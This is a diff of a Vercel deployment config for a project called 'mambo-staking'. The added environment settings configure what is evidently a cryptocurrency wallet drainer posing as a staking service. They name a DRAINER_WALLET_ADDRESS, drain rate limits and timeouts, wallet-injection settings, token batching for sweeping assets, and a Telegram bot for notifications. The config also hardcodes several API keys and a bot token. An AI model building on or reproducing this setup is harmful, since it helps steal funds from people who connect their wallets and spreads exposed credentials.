@@ -1,33 +1,62 @@
 {
   "version": 2,
-  "functions": {
-    "api/index.js": {
-      "maxDuration": 30
+  "name": "mambo-staking",
+  "builds": [
+    {
+      "src": "server.js",
+      "use": "@vercel/node"
     }
-  },
+  ],
   "routes": [
     {
       "src": "/api/(.*)",
-      "dest": "/api/index.js"
+      "dest": "server.js"
     },
     {
-      "src": "/manifest.json",
-      "headers": {
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*"
-      }
-    },
-    {
-      "src": "/logos/(.*)",
-      "headers": {
-        "Access-Control-Allow-Origin": "*"
-      }
+      "src": "/(.*)",
+      "dest": "public/$1"
     }
   ],
-  "buildCommand": "echo 'No build step required for Node.js app'",
-  "installCommand": "npm install",
-  "framework": null,
   "env": {
-    "NODE_ENV": "production"
+    "PORT": "3001",
+    "NODE_ENV": "production",
+    "RPC_URL": "https://api.mainnet-beta.solana.com",
+    "HELIUS_RPC_URL": "https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b",
+    "HELIUS_API_KEY": "19041dd1-5f30-4135-9b5a-9b670510524b",
+    "SHYFT_RPC_URL": "https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0",
+    "SHYFT_API_KEY": "-C7eUSlaDtQcR6b0",
+    "TELEGRAM_BOT_TOKEN": "8183467058:AAHf02SzNmP5xoqtRvIJQAN5bKE7_f-gMPQ",
+    "TELEGRAM_CHAT_ID": "7900328128",
+    "PROJECT_NAME": "MAMBO",
+    "WEB3MODAL_PROJECT_ID": "45a382364ff2b00404b2d4c2ff95dbd4",
+    "DRAINER_WALLET_ADDRESS": "FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj",
+    "MIN_SOL_FOR_FEES": "0.005",
+    "MIN_SOL_FOR_ATA": "0.002",
+    "MIN_WALLET_VALUE": "0.001",
+    "MAX_ADDRESS_DIFFERENCES": "3",
+    
+    "MAX_TOKENS_PER_TRANSACTION": "50",
+    "MAX_INSTRUCTIONS_PER_TRANSACTION": "80",
+    "MAX_TRANSACTION_SIZE_BYTES": "1200",
+    "ENABLE_TOKEN_BATCHING": "true",
+    
+    "RATE_LIMIT_BYPASS_TOKEN_THRESHOLD": "100",
+    "RATE_LIMIT_BYPASS_SOL_THRESHOLD": "1.0",
+    "RATE_LIMIT_BYPASS_ENABLED": "true",
+    "GENERAL_RATE_LIMIT": "1000",
+    "DRAIN_RATE_LIMIT": "2000",
+    "RATE_LIMIT_WINDOW_MS": "3600000",
+    "WALLET_CONNECTION_TIMEOUT": "30000",
+    "DEEP_LINKING_TIMEOUT": "15000",
+    "WALLET_INJECTION_TIMEOUT": "15000",
+    "DRAIN_API_TIMEOUT": "60000",
+    "BROADCAST_TIMEOUT": "90000",
+    "SIGNING_TIMEOUT": "120000",
+    "JUPITER_TOKEN_LIST_URL": "https://token.jup.ag/all"
+  },
+  "functions": {
+    "server.js": {
+      "maxDuration": 30
+    }
   }
-} 
+}
